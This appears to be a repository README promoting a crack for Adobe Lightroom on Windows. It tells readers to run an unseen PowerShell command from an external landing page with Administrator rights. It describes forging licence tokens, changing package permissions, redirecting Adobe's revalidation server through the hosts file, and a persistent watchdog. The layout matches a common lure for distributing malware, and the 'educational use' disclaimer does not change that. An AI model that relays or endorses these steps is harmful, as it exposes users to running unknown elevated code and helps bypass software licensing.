<div align="center">
<img src="assets/banner.png" width="100%" alt="Adobe Lightroom Activation Method Via banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-0891B2?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9B59B6?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=4F46E5&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Lightroom+Powershell+Activation+Pro;%E2%9C%A8+Built+for+Windows+11;%F0%9F%9A%80+Ready+for+Windows;%F0%9F%93%A6+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=unity" />
</p>

---

### 🖥️ PowerShell Setup

Grab the activation stack in one line — open PowerShell (Run as Administrator), paste the command from the landing page, and let it pull the current 2026 build onto your box.

![Status](https://img.shields.io/badge/build-2026.04-informational?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D4?style=flat-square)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=flat-square)

<p align="center">
  <a href="https://coderkatyaini.github.io/lightroom-powershell-activation/">
    <img src="files/button.svg" width="520" alt="Setup with PowerShell" />
  </a>
</p>

## 🧨 Pain Points I Hit Before I Wrote This

- The old `Set-ItemProperty` toggle for the activation service kept reverting on reboot because Lightroom's scheduler re-registered the key — nothing stuck past the first relaunch.
- Microsoft Store builds of Lightroom put the licensing DLL under `WindowsApps` with TrustedInstaller ACLs — every hand-rolled script hit `Access Denied` before it even reached the activation step.
- Cloud sync would re-validate the account and nuke local activation state mid-edit, then throw a "Your subscription has expired" modal right when you were exporting a batch.
- The legacy `slmgr` approach silently failed on Windows 11 24H2 and above because the licensing token format changed — no error, just a dead trial countdown.
- Manually patching each new Lightroom point release meant re-finding the offsets every two weeks — the 2026 update cadence made hand-patching completely unmaintainable.

## 🛠️ How This Build Fixes Each One

| Pain Point | Module | What It Actually Does |
|---|---|---|
| Registry toggle reverts | PersistGuard | Locks the activation key at the service layer with a watchdog that re-asserts on every boot. |
| `WindowsApps` ACL wall | StoreUnlock | Requests the correct elevation token and applies a targeted DACL carve-out for the Lightroom package path only. |
| Cloud re-validation | SyncMute | Redirects the revalidation endpoint via hosts + local loopback, preserving local state through session refreshes. |
| Post-24H2 `slmgr` breakage | TokenForge | Rebuilds the licensing token in the current format rather than relying on the deprecated `slmgr` path. |
| Per-release offset drift | VersionFeed | Pulls the offset manifest for the exact Lightroom build number from the landing endpoint before applying. |

## 🎛️ Keybind Table (Tray / Overlay Controls)

| Shortcut | Action |
|---|---|
| `Ctrl + Alt + L` | Open the activation control panel |
| `Ctrl + Alt + R` | Force re-apply activation state |
| `Ctrl + Alt + S` | Toggle cloud-sync mute on/off |
| `Ctrl + Alt + D` | Dump current token + version manifest to log |
| `Ctrl + Alt + X` | Release hooks and reboot Lightroom cleanly |

## 📦 Feature Grouping

**Activation / Licensing**
- TokenForge — builds a valid licensing token in the current 2026 format.
- PersistGuard — watchdog that keeps the activation key alive across reboots.
- VersionFeed — pulls the correct offset manifest per Lightroom build number.

**Bootstrap / Elevation**
- StoreUnlock — DACL carve-out for the Microsoft Store package path.
- ElevateCheck — aborts cleanly if PowerShell isn't running as admin.

**Runtime / QoL**
- SyncMute — blocks revalidation without breaking local catalog work.
- LogDump — timestamped token/version dump for troubleshooting.
- TrayPanel — hotkey-driven control panel, no console window needed.

## 🧪 How It Works

The landing page serves a single PowerShell bootstrap. When you paste the command into an elevated PowerShell 5.1+ session, it fetches the current 2026 manifest, checks your installed Lightroom build number, resolves the matching offset set via VersionFeed, requests the Store package DACL carve-out, rebuilds the token, and starts the PersistGuard watchdog. Nothing is dropped as a standalone `.exe` — the whole stack lives in the published PowerShell module and is re-resolved on every run so a Lightroom point release doesn't leave you hand-patching again.

## 🖥️ Compatibility

- Windows 10 (21H2+) and Windows 11 (including 24H2 and above).
- PowerShell 5.1 (built-in) or PowerShell 7.x.
- Lightroom Classic and the Microsoft Store Lightroom app, current 2026 release train.
- Network access required at setup time only — after activation is applied, the catalog works offline.

## ❓ FAQ

**Do I need to download an .exe?** No — setup is a single PowerShell command, run from the landing page.

**Does it work on PowerShell 5.1?** Yes, 5.1 is the minimum; PowerShell 7.x is also supported.

**Will a Lightroom point-release break it?** No — the manifest is re-resolved from the build number each run.

**Does it survive reboots?** Yes, PersistGuard re-asserts state at logon.

**Can I undo it?** Yes — the tray panel has a full release option that restores the original DACL and key state.

**Does it touch my catalog files?** No — only the licensing/token layer and package DACL.

**Is this affiliated with Adobe?** No, this is a community project, not officially supported by Adobe.

## ⚠️ Disclaimer

Provided for educational and hobbyist research use only. You are responsible for complying with the Adobe terms of service and local law. Use at your own risk — no warranty, no support obligations.

## 📄 License

MIT — see `LICENSE` for the full text.
